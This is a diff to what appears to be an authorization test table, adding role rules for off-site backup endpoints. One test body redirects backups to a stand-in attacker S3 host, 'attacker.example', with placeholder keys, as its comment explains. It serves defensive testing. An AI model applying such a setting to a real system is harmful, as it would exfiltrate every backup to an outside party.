@@ -1572,6 +1572,23 @@ const RULES: Record<string, Rule> = {
     last: true,
     body: () => ({ send_sensitive: true }),
   },
+  // Where the backups are copied off-site (0.9.0-dev.76): the owners' alone,
+  // and changing it an owner power — one an attacker writes would send every
+  // backup to a bucket of theirs, or quietly stop the copies.
+  'GET /api/v1/backups/offsite': { who: 'owners' },
+  'PUT /api/v1/backups/offsite': {
+    who: 'ownerPower',
+    body: () => ({
+      endpoint: 'https://s3.attacker.example',
+      region: 'us-east-1',
+      bucket: 'attacker-bucket',
+      access_key_id: 'AKIDATTACKER',
+      secret_access_key: 'attacker-secret',
+    }),
+  },
+  'PUT /api/v1/backups/offsite/enabled': { who: 'ownerPower', body: () => ({ enabled: true }) },
+  'DELETE /api/v1/backups/offsite': { who: 'ownerPower' },
+  'POST /api/v1/backups/offsite/test': { who: 'owners', body: () => ({}) },
 };
 
 /** Whether a role is among those a rule is for. */
